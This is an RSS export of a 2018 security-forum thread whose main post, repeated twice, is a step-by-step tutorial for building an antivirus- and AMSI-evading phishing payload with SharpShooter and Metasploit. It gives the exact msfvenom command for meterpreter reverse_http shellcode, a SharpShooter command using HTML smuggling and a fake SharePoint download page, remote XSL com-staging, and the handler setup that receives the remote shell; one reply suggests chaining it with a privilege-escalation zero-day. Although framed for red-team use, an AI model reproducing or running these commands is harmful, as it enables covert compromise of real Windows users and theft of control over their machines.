<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
    <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178</link>
    <description># Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo
Hi! I hope you&#39;re well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind of thing every day without thinking about it. However, if you&#39;re new to security, or you&#39;re just not involved in the industry, a lot of these techniques and appear a bit daunting and long-winded. I&#39;m here to show that it really isn&#39;t hard, and you don&#39;t need Cobalt Strike to do it, despite how awesome it is. 

## Here is a demo of it running with Cobalt Strike.

https://vimeo.com/276760800

Today I am going to show you how to:
- Create a payload that isn&#39;t detected by Windows Defender, even with real-time protection, advanced threat protection, and AMSI
- Do all of this without Cobalt Strike, and instead with Sharpshooter + Metasploit/Msfvenom*

&lt;small&gt;*If you have a problem with metasploit framework, I understand. It is usually associated with people who just fire exploits at random hosts in a hope to get shells. However, I do not think that we should discard a very useful tool because of its sad minority of users. Metasploit is a great tool when used correctly, can provide tremendous value, and it&#39;s free!&lt;/small&gt;

--- 
#### Author Assigned Level: Wannabe
#### Community Assigned Level:
[poll type=regular]
* Newbie
* Wannabe
* Hacker
* Wizard
* Guru
[/poll]

#### Required Skills
* Understanding of payload generation with metasploit
* Understanding of metasploit payloads
* Basic networking understanding
 
---

### Disclaimer
In no way to do I claim this to be my work, this is purely my take on this method, and if you want to read the original source of this information, please read it from [here](https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/). This is an excellent method developed by Dominic Chell from Mdsec, and I wanted to re-write this in a way I think is more concise and holistic. As a side note, some images and videos may be sourced from that article.

---


One of the reasons I chose to do a write-up on this, especially when very good articles have already been written by [mdsec](http://mdsec.co.uk/), such as [Payload Generation with Sharpshooter](https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/) and [Freestyling with Sharpshooter](https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/), is because I feel there are certain things that are assumed that you know how to use; things such as `--rawscfile` payload generation. 

In this article, I will assume previous metasploit + msfvenom experience, the concept of xsl&#39;s ([how to do it manually](https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356)), and experience using the CLI in Linux. 

This is a really easy way to generate undetectable payloads, and I am here to show you just how easy it is. If you&#39;re already quite proficient, just scan down and read the code, **I&#39;m sure most of you are just skim reading this article anyway :P** 
## Prerequisites
Something to keep in mind:
- You can only use Python 2 with Sharpshooter. It will run with Python 3, but it&#39;ll break stuff. Don&#39;t ask me. It only caused me about 10 hours of trouble. (not quite, but you get the idea)
- Cloned Repo + Setup of [Sharpshooter](https://github.com/mdsecactivebreach/SharpShooter)
- Cloned Repo/Install of [metasploit framework](https://github.com/rapid7/metasploit-framework/) (Use rvm and install deps with bundler) 

## Generating your shellcode
You&#39;ll need msfvenom for this task, in other examples of how to use sharpshooter, you&#39;ll use things like csharp byte-arrays. For this example, we&#39;ll be using straight up shellcode. Lucky for us, msfvenom actually will do this for us in one command.

Run the following:
```bash
./msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.221 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f raw -o shellcode.txt
```

![Msfvenom creating shellcode](//0x00sec.s3.amazonaws.com/original/2X/0/0f913fe8872d8a3a57d80da9b1551734e8940957.png)

If you&#39;ve used msfvenom before, you&#39;ll know that this is just generating a payload for the x64 architecture (64bit), using the meterpreter reverse_http payload. The reverse_http payload option helps us to remain more stealthy, and slide past low-complexity packet inspection firewalls. For example, some firewalls allow you to allow &quot;http&quot; traffic. This will slide past that.

---
# Generating your Payload
Now you&#39;ve generated your shellcode, place the shellcode.txt file inside the same directory. Now if you&#39;re using a distro such as Arch Linux, &quot;Python&quot; will be Python3 by default. Whereas on Ubuntu + Kali, it will be Python2 by default. You can easily verify which is true for you by running `python --version`.

Now run the following, with the correct python executable, for me, this was `python2`.

```
python2 SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile raw3.txt --smuggle --template sharepoint --com xslremote --awlurl http://192.168.1.221:8000/foo.xsl
```
![Sharpshooter generating a payload](//0x00sec.s3.amazonaws.com/original/2X/b/b8fafb920065e0d3ad5065d64caec0dbc3c54fc3.png)  

  This will do multiple things. Firstly it will create a stageless payload, this means that it will not be staged, and therefore will have everything it _needs_ inside the payload. This can be a bit misleading, as it will later pull a `.xsl` file, however as far as you need to know, this is a stageless payload.

Secondly, it will specify dotnet version 2 to use, you need to ensure that the target has this version of dotnet installed, if they do not, then this will fail. Most Windows targets have at least dotnet version 2, so this is usually fine. 

Next we specify which payload type to use, in this case, I specify JS, however, we could easily also specify something such as `vba`.

After that, we use the --smuggle function. Some firewalls and security software blocks downloads of `.js` and `.vba` files, this --smuggle function wraps the file up inside the html file, encodes and encrypts it. On page load, the data is decrypted and decoded and saved as a blob. No more do spam filters that block malicious extensions work. (I love this feature). In the same breath, we specify a template, all this will do is make the page look more legitimate, in this case, we specify `SharePoint` as the template, this means that the phishing HTML will look like it is downloading from Microsoft Sharepoint.

Now we get to the exciting bit, com-staging. Com-staging is a term coined by Dom Chell from Mdsec,  to break it down, some Microsoft applications such as Outlook, have functions that allow you to run shell commands, such as `obj.CreateObject(&quot;Wscript.shell&quot;).run(&quot;fun commands&quot;)`. This is leveraged by sharpshooter, and this in case, it is leveraging WMI to execute code from an XSL file. 

Next, we need to specify our --awlurl, this will be where the xsl file will be located. In my case, I have specified at my `http://myip:8000/file.xsl`, because it is by default placed into the `output` folder, and I am going to run a python http server in there.

---
# Serving up our Malicious files...
`cd` into the `./output` directory, and run:
```bash
python3 -m http.server
```

This will create a basic python web server on port 8000, inside this directory.

Now, in another window, start your Metasploit handler.

```bash
sudo -E ./msfconsole
use exploit/multi/handler
set LHOST 192.168.1.221
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_http
set ExitOnSession false
exploit -j
``` 

Now you should have a reverse_http handler started. Simply ensure that ports 8000 and ports 443 are open. And now navigate to `http://yourip:8000/foo.html`. You should be able to open the files, and should receive a shell!

![Recieving a shell connection in metasploit](//0x00sec.s3.amazonaws.com/original/2X/a/affc016d28820888e9fd282435703118bb2de01e.png)

## Demo
&lt;img src=&#39;//0x00sec.s3.amazonaws.com/original/2X/a/ad8bec3f8a94145af74b397fbee21f1bc1b27676.gif&#39;&gt;

---
## Conclusion
Sharpshooter + SquibblyTwo with Com-staging is working an absolute treat to bypass AMSI, for now. Let&#39;s see how long this lasts, for now though, we should abuse the hell out of this in red team assessments + advanced pentests. In future articles, I may begin to examine MacOS security and more.. Stay tuned!</description>
    
    <lastBuildDate>Wed, 29 Aug 2018 16:17:41 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/8">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/8</link>
        <pubDate>Thu, 20 Sep 2018 14:19:45 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-8</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[hiepdang]]></dc:creator>
        <description><![CDATA[
            <p>Thanks for nice tutorial!</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/7</link>
        <pubDate>Wed, 29 Aug 2018 16:17:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-7</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Thanks man! Please show me when you have that, perhaps even write an article?</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/6</link>
        <pubDate>Wed, 29 Aug 2018 15:06:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-6</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[mcpwn84]]></dc:creator>
        <description><![CDATA[
            <p>Awesome writeup dude, now can mix with ALPC recent 0day to privesc quickly <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/5</link>
        <pubDate>Wed, 29 Aug 2018 15:05:26 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-5</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[bl4ckbo7]]></dc:creator>
        <description><![CDATA[
            <p>Nice write-up man! <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a></p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/4</link>
        <pubDate>Tue, 21 Aug 2018 18:49:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-4</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Thank you man! That was my intention <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>I’ll make sure to keep the people here updated with all the latest techniques that I learn.</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/3</link>
        <pubDate>Tue, 21 Aug 2018 17:52:27 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-3</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[Baud]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for the very well written guide, I didn’t know sharpshooter until now. This goes straight to my favorites for later testing <img src="https://0x00sec.org/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/2</link>
        <pubDate>Tue, 21 Aug 2018 17:50:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-2</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
      <item>
        <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <h1>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</h1>
<p>Hi! I hope you’re well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind of thing every day without thinking about it. However, if you’re new to security, or you’re just not involved in the industry, a lot of these techniques and appear a bit daunting and long-winded. I’m here to show that it really isn’t hard, and you don’t need Cobalt Strike to do it, despite how awesome it is.</p>
<h2>Here is a demo of it running with Cobalt Strike.</h2>
<p>          <p><a href="https://vimeo.com/276760800">https://vimeo.com/276760800</a></p>
</p>
<p>Today I am going to show you how to:</p>
<ul>
<li>Create a payload that isn’t detected by Windows Defender, even with real-time protection, advanced threat protection, and AMSI</li>
<li>Do all of this without Cobalt Strike, and instead with Sharpshooter + Metasploit/Msfvenom*</li>
</ul>
<p><small>*If you have a problem with metasploit framework, I understand. It is usually associated with people who just fire exploits at random hosts in a hope to get shells. However, I do not think that we should discard a very useful tool because of its sad minority of users. Metasploit is a great tool when used correctly, can provide tremendous value, and it’s free!</small></p>
<hr>
<h4>Author Assigned Level: Wannabe</h4>
<h4>Community Assigned Level:</h4>
<p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/1">Click to view the poll.</a></p>
<h4>Required Skills</h4>
<ul>
<li>Understanding of payload generation with metasploit</li>
<li>Understanding of metasploit payloads</li>
<li>Basic networking understanding</li>
</ul>
<hr>
<h3>Disclaimer</h3>
<p>In no way to do I claim this to be my work, this is purely my take on this method, and if you want to read the original source of this information, please read it from <a href="https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/">here</a>. This is an excellent method developed by Dominic Chell from Mdsec, and I wanted to re-write this in a way I think is more concise and holistic. As a side note, some images and videos may be sourced from that article.</p>
<hr>
<p>One of the reasons I chose to do a write-up on this, especially when very good articles have already been written by <a href="http://mdsec.co.uk/">mdsec</a>, such as <a href="https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/">Payload Generation with Sharpshooter</a> and <a href="https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/">Freestyling with Sharpshooter</a>, is because I feel there are certain things that are assumed that you know how to use; things such as <code>--rawscfile</code> payload generation.</p>
<p>In this article, I will assume previous metasploit + msfvenom experience, the concept of xsl’s (<a href="https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356">how to do it manually</a>), and experience using the CLI in Linux.</p>
<p>This is a really easy way to generate undetectable payloads, and I am here to show you just how easy it is. If you’re already quite proficient, just scan down and read the code, <strong>I’m sure most of you are just skim reading this article anyway <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></strong></p>
<h2>Prerequisites</h2>
<p>Something to keep in mind:</p>
<ul>
<li>You can only use Python 2 with Sharpshooter. It will run with Python 3, but it’ll break stuff. Don’t ask me. It only caused me about 10 hours of trouble. (not quite, but you get the idea)</li>
<li>Cloned Repo + Setup of <a href="https://github.com/mdsecactivebreach/SharpShooter">Sharpshooter</a>
</li>
<li>Cloned Repo/Install of <a href="https://github.com/rapid7/metasploit-framework/">metasploit framework</a> (Use rvm and install deps with bundler)</li>
</ul>
<h2>Generating your shellcode</h2>
<p>You’ll need msfvenom for this task, in other examples of how to use sharpshooter, you’ll use things like csharp byte-arrays. For this example, we’ll be using straight up shellcode. Lucky for us, msfvenom actually will do this for us in one command.</p>
<p>Run the following:</p>
<pre><code class="lang-bash">./msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.221 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f raw -o shellcode.txt
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/0/0f913fe8872d8a3a57d80da9b1551734e8940957.png" alt="Msfvenom creating shellcode" width="" height=""></p>
<p>If you’ve used msfvenom before, you’ll know that this is just generating a payload for the x64 architecture (64bit), using the meterpreter reverse_http payload. The reverse_http payload option helps us to remain more stealthy, and slide past low-complexity packet inspection firewalls. For example, some firewalls allow you to allow “http” traffic. This will slide past that.</p>
<hr>
<h1>Generating your Payload</h1>
<p>Now you’ve generated your shellcode, place the shellcode.txt file inside the same directory. Now if you’re using a distro such as Arch Linux, “Python” will be Python3 by default. Whereas on Ubuntu + Kali, it will be Python2 by default. You can easily verify which is true for you by running <code>python --version</code>.</p>
<p>Now run the following, with the correct python executable, for me, this was <code>python2</code>.</p>
<pre><code class="lang-auto">python2 SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile raw3.txt --smuggle --template sharepoint --com xslremote --awlurl http://192.168.1.221:8000/foo.xsl
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b8fafb920065e0d3ad5065d64caec0dbc3c54fc3.png" alt="Sharpshooter generating a payload" width="" height=""></p>
<p>This will do multiple things. Firstly it will create a stageless payload, this means that it will not be staged, and therefore will have everything it <em>needs</em> inside the payload. This can be a bit misleading, as it will later pull a <code>.xsl</code> file, however as far as you need to know, this is a stageless payload.</p>
<p>Secondly, it will specify dotnet version 2 to use, you need to ensure that the target has this version of dotnet installed, if they do not, then this will fail. Most Windows targets have at least dotnet version 2, so this is usually fine.</p>
<p>Next we specify which payload type to use, in this case, I specify JS, however, we could easily also specify something such as <code>vba</code>.</p>
<p>After that, we use the --smuggle function. Some firewalls and security software blocks downloads of <code>.js</code> and <code>.vba</code> files, this --smuggle function wraps the file up inside the html file, encodes and encrypts it. On page load, the data is decrypted and decoded and saved as a blob. No more do spam filters that block malicious extensions work. (I love this feature). In the same breath, we specify a template, all this will do is make the page look more legitimate, in this case, we specify <code>SharePoint</code> as the template, this means that the phishing HTML will look like it is downloading from Microsoft Sharepoint.</p>
<p>Now we get to the exciting bit, com-staging. Com-staging is a term coined by Dom Chell from Mdsec,  to break it down, some Microsoft applications such as Outlook, have functions that allow you to run shell commands, such as <code>obj.CreateObject("Wscript.shell").run("fun commands")</code>. This is leveraged by sharpshooter, and this in case, it is leveraging WMI to execute code from an XSL file.</p>
<p>Next, we need to specify our --awlurl, this will be where the xsl file will be located. In my case, I have specified at my <code>http://myip:8000/file.xsl</code>, because it is by default placed into the <code>output</code> folder, and I am going to run a python http server in there.</p>
<hr>
<h1>Serving up our Malicious files…</h1>
<p><code>cd</code> into the <code>./output</code> directory, and run:</p>
<pre><code class="lang-bash">python3 -m http.server
</code></pre>
<p>This will create a basic python web server on port 8000, inside this directory.</p>
<p>Now, in another window, start your Metasploit handler.</p>
<pre><code class="lang-bash">sudo -E ./msfconsole
use exploit/multi/handler
set LHOST 192.168.1.221
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_http
set ExitOnSession false
exploit -j
</code></pre>
<p>Now you should have a reverse_http handler started. Simply ensure that ports 8000 and ports 443 are open. And now navigate to <code>http://yourip:8000/foo.html</code>. You should be able to open the files, and should receive a shell!</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/affc016d28820888e9fd282435703118bb2de01e.png" alt="Recieving a shell connection in metasploit" width="" height=""></p>
<h2>Demo</h2>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/ad8bec3f8a94145af74b397fbee21f1bc1b27676.gif" width="" height=""></p>
<hr>
<h2>Conclusion</h2>
<p>Sharpshooter + SquibblyTwo with Com-staging is working an absolute treat to bypass AMSI, for now. Let’s see how long this lasts, for now though, we should abuse the hell out of this in red team assessments + advanced pentests. In future articles, I may begin to examine MacOS security and more… Stay tuned!</p>
          <p><a href="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178/1</link>
        <pubDate>Tue, 21 Aug 2018 14:19:44 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-8178-1</guid>
        <source url="https://0x00sec.org/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178.rss">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</source>
      </item>
  </channel>
</rss>
